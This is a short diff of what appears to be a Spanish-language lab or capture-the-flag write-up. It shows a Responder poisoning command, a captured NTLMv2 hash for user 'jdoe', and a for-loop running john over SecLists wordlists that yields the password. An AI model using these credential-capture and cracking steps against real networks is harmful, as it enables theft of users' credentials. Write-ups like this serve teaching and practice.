@@ -197,7 +197,7 @@ python3 Responder.py -I eth0 -wd
 [SMB] NTLMv2-SSP Hash     : jdoe::hackme:faa58de1eb3d1697:AAB3D6BA09ABCC85ED1F843AF879EBE3:0101000000000000000855D3987CDB0167B939FA04E68AAD0000000002000800540032003500390001001E00570049004E002D0030003800300032004700460030004F005A005700520004003400570049004E002D0030003800300032004700460030004F005A00570052002E0054003200350039002E004C004F00430041004C000300140054003200350039002E004C004F00430041004C000500140054003200350039002E004C004F00430041004C0007000800000855D3987CDB01060004000200000008003000300000000000000000000000004000001AD337D04DF3A7641AB484A3BE312D3DF4FB5C6AB976C6A49E2347AC10EBE5740A0010000000000000000000000000000000000009001C0063006900660073002F00530051004C00730065007200760065007200000000000000000000000000
 ```
 
-Tras un rato de espera consigo obtener una hash NTLMv2, el cual consigo crackear de forma offline con john, como no conseguía encontrar la contraseña utilice un bucle for que iterase sobre todos los diccionarios de la categoría Passwords de seclists, consiguiendo así crackear la contraseña, la cual es '$pr1ng@'
+Tras un rato de espera consigo obtener una hash NTLMv2, el cual consigo crackear de forma offline con john, como no conseguía encontrar la contraseña utilice un bucle for que iterase sobre todos los diccionarios de la categoría Passwords de seclists, consiguiendo así crackear el hash, la contraseña es '$pr1ng@'
 
 ```bash
 for dict in /usr/share/seclists/Passwords/*.txt; do john --wordlist=$dict hash;done
